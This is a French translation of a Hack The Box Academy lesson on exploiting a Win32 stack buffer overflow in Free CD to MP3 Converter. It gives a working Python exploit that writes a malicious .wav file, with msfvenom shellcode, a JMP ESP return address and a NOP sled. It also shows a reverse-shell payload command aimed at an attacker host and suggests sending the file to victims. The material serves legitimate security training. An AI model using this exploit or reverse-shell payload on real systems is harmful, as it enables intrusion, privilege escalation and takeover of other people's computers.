Passer au Shellcode
====================

* * * * *

Jusqu'à présent, dans notre exercice d'identification et d'exploitation d'une vulnérabilité de débordement de tampon basée sur la pile, nous avons effectué les opérations suivantes :

1. Fuzz paramètres
2. Prendre controle de EIP
3. Identifier les mauvais Chars
4. Trouver une instruction de retour

La dernière étape consiste à écrire du shellcode sur la pile qui est exécuté lorsque les adresses de retour que nous avons trouvées plus tôt sont exécutées puisque nous recherchons des adresses d'instructions qui exécutent le code écrit en haut de la pile.

* * * * *

Génération de shellcode
--------------------

Nous avons discuté en détail de la génération de shellcode dans le module [Introduction au langage d'assemblage](https://academy.hackthebox.com/course/preview/intro-to-assembly-language) et des différentes méthodes pour le faire. Dans certains cas, nous pouvons nous retrouver limités à un espace tampon très court, où nous n'aurions pas beaucoup d'octets sur lesquels écrire et pourrions devoir utiliser l'une des méthodes décrites pour générer un shellcode court. Cependant, nous avons affaire à des milliers d'octets de mémoire tampon dans notre cas, nous n'aurions donc pas à nous soucier de ces limitations.

Ainsi, pour générer notre shellcode, nous utiliserons `msfvenom`, qui peut générer des shellcodes pour les systèmes Windows, tandis que des outils comme `pwntools` ne prennent actuellement en charge que les shellcodes Linux.

Tout d'abord, nous pouvons répertorier toutes les charges utiles disponibles pour "Windows 32 bits", comme suit :

```
dsgsec@htb[/htb]$ msfvenom -l payloads | grep

...SNIP...
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
...SNIP...

```

Pour le test initial, essayons `windows/exec` et exécutons `calc.exe` pour ouvrir la calculatrice Windows si notre exploit réussit. Pour ce faire, nous utiliserons `CMD=calc.exe`, `-f 'python'` puisque nous utilisons un exploit python, et `-b` pour spécifier les caractères incorrects :

```
dsgsec@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
...SNIP..

```

Remarque : Nous avons utilisé `-b` pour montrer comment éliminer les mauvais caractères de notre shellcode, où nous pouvons ajouter tous les mauvais caractères que nous devons éliminer (par exemple `'\x00\x0a\x0d'`). Même si notre shellcode n'avait pas de mauvais caractères, ce shellcode devrait toujours fonctionner, bien que le shellcode final soit généralement plus long si nous spécifions de mauvais caractères

Ensuite, nous pouvons copier la variable `buf` dans notre exploit, où nous allons maintenant définir la fonction finale `def exploit()`, qui sera notre principal code d'exploitation :

Code : python

```
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

```

Astuce : Il est conseillé d'ajouter un commentaire au-dessus de tout shellcode avec la commande utilisée pour le générer, au cas où nous voudrions le modifier ou le régénérer à l'avenir, ou si nous voulions simplement savoir ce qu'il va exécuter.

* * * * *

La charge utile finale
-----------------

Maintenant que nous avons notre shellcode, nous pouvons écrire la charge utile finale que nous écrirons dans le fichier `.wav` à ouvrir dans notre programme. Jusqu'à présent, nous savons ce qui suit :

1. `buffer` : nous pouvons remplir le tampon en écrivant `b"A"*offset`
2. `EIP` : Les 4 octets suivants doivent être notre adresse de retour
3. `buf` : Après cela, nous pouvons ajouter notre shellcode

Dans la section précédente, nous avons trouvé plusieurs adresses de retour qui peuvent fonctionner pour exécuter n'importe quel shellcode que nous écrivons sur la pile :

| `ESP` | `JMP ESP` | `PUSH ESP; RET` |
| --- | --- | --- |
| `0014F974` | `00419D0B` | `0047D4F5` |
| - | `00463B91` | `00483D0E` |
| - | `00477A8B` | - |
| - | `0047E58B` | - |
| - | `004979F4` | - |

N'importe lequel d'entre eux devrait fonctionner pour exécuter le shellcode que nous écrivons sur la pile (n'hésitez pas à en tester certains). Nous commencerons par le plus fiable, `JMP ESP`, et nous choisirons la première adresse `00419D0B` et l'écrirons comme adresse de retour.

Pour le convertir `hex` en une adresse dans Little Endian, nous allons utiliser une fonction python appelée `pack` trouvée dans la bibliothèque `struct` . Nous pouvons importer cette fonction en ajoutant la ligne suivante au début de notre code :

Code : python

```
from struct import pack

```

Nous pouvons maintenant utiliser `pack` pour transformer notre adresse dans son format approprié, et utiliser '`<L`' pour spécifier que nous la voulons au format Little Endian :

Code : python

```
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)

```

* * * * *

Rembourrage du shellcode
-----------------

Maintenant que nous avons `buffer` et `eip`, nous pouvons ajouter notre shellcode `buf` après eux et générer notre fichier `.wav` . Cependant, selon le cadre de pile et l'alignement de pile actuels du programme, au moment où notre instruction `JMP ESP` est exécutée, le haut de l'adresse de pile `ESP` peut avoir légèrement bougé. Les premiers octets de notre shellcode peuvent être ignorés, ce qui entraînera l'échec du shellcode. (Vous pouvez consulter le module [Intro to Assembly Language](https://academy.hackthebox.com/module/details/85) pour mieux comprendre l'alignement de la pile).

Une façon de résoudre ce problème est d'ajouter quelques octets inutiles avant notre shellcode et de continuer à tester le code jusqu'à ce que nous sachions exactement combien d'octets sont ignorés avant notre shellcode. C'est ainsi que nous pouvons précisément atterrir au début de notre shellcode lorsque notre instruction `JMP ESP` est exécutée. Cependant, nous n'avons besoin de recourir à cette méthode que si nous disposions d'un espace tampon limité car il faut plusieurs tentatives pour trouver précisément à quelle position d'octet de notre shellcode l'exécution commence.

Pour éviter d'avoir à le faire, nous pouvons ajouter quelques octets `NOP` avant notre shellcode, qui a le code machine `0x90`. L'instruction d'assemblage `NOP` est l'abréviation de `No Operation`, et elle est utilisée dans l'assemblage pour des choses comme attendre que d'autres opérations se terminent. Ainsi, si l'exécution `JMP ESP` commence à l'un de ces octets, le programme ne plantera pas et exécutera ces octets en ne faisant rien jusqu'à ce qu'il atteigne le début de notre shellcode. À ce stade, tout notre shellcode devrait être exécuté et devrait fonctionner avec succès.

L'alignement de la pile nécessaire ne dépasse généralement pas `16` octets dans la plupart des cas, et il peut rarement atteindre `32` octets. Comme nous avons beaucoup d'espace tampon, nous allons simplement ajouter `32` octets de `NOP` avant notre shellcode, ce qui devrait garantir que l'exécution commence quelque part dans ces octets, et continuer à exécuter notre shellcode principal :

Code : python

```
     nop = b"\x90"*32

```

* * * * *

Écriture de la charge utile dans un fichier
------------------------

Avec cela, notre charge utile finale devrait ressembler à ceci :

Code : python

```
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

```

Nous pouvons ensuite écrire `payload` dans un fichier `exploit.wav` , comme nous l'avons fait dans les fonctions précédentes :

Code : python

```
    with open('exploit.wav', 'wb') as f:
        f.write(payload)

```

Une fois que nous avons assemblé toutes ces parties, notre fonction `exploit()` finale devrait ressembler à ceci :

Code : python

```
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf = b""
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()

```

Nous pouvons maintenant exécuter notre code avec `F5` dans `IDLE` pour générer le fichier `exploit.wav` . Une fois que c'est fait, nous pouvons exécuter le programme `Free CD to MP3 Converter` (nous n'avons pas besoin de l'exécuter dans `x32dbg`) et y charger notre fichier :

![Calc](https://academy.hackthebox.com/storage/modules/89/win32bof_calc.jpg)

Comme nous pouvons le voir, notre programme a planté, mais nous l'avons exploité avec succès et avons exécuté notre shellcode, qui a ouvert `calc.exe`.

* * * * *

Obtenir l'exécution du code
----------------------

La dernière étape serait d'utiliser cet exploit pour obtenir l'exécution du code. Étant donné que nous avons affaire à un débordement de tampon local s'exécutant sur une machine à laquelle nous avons un accès au niveau utilisateur, nous utiliserons généralement cet exploit pour élever nos privilèges à l'utilisateur administrateur si un administrateur local a exécuté ce programme. Une autre façon d'utiliser cela consiste à écrire un fichier `.wav` malveillant qui renvoie un shell inversé. Nous partagerions ensuite ce fichier malveillant avec un utilisateur qui utilise cette application vulnérable et lui demanderions d'encoder notre fichier `.wav` malveillant. Lorsqu'ils le font, nous recevons une coque inversée et prenons le contrôle de leur PC.

Pour faire l'une ou l'autre de ces options, tout ce que nous avons à faire est de changer notre shellcode pour faire autre chose. Pour l'élévation locale des privilèges, nous pouvons utiliser la même commande que nous avons utilisée pour `calc.exe`, mais utiliser `CMD=cmd.exe` à la place, comme suit :

```
dsgsec@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'

...COUPER...
buf = b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
...COUPER...

```

Si nous voulions obtenir un shell inversé, nous pouvons utiliser de nombreuses charges utiles "msfvenom", dont nous pouvons obtenir la liste suivante :

```
dsgsec@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse

...SNIP...
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
...SNIP...

```

Nous pouvons utiliser la charge utile `windows/shell_reverse_tcp` comme suit :

```
dsgsec@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
...SNIP...

```

Nous pouvons remplacer le shellcode `buf` de notre exploit par l'un ou l'autre et le tester. Supposons que nous ayons accès à une machine sur laquelle nous avons le privilège d'exécuter ce programme en tant qu'administrateur. Nous allons écrire le shellcode pour l'élévation locale des privilèges dans notre exploit, générer notre fichier `exploit.wav` et le charger dans le programme :

![Administrateur CMD](https://academy.hackthebox.com/storage/modules/89/win32bof_cmd_admin.jpg)

Comme nous pouvons le voir, cette fois, une fenêtre `cmd.exe` est apparue, et nous voyons dans son titre `Administrator`, ce qui signifie qu'il s'exécute effectivement avec des privilèges élevés, correspondant à l'utilisateur qui exécutait `Free CD to MP3 Convertisseur`.

Essayez d'utiliser le second shellcode pour obtenir un reverse shell sur votre VM Linux/`PwnBox`.

Vous pouvez télécharger le code d'exploitation final à partir de [ce lien](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_py.txt). N'oubliez pas de le renommer `.txt` en `.py`.
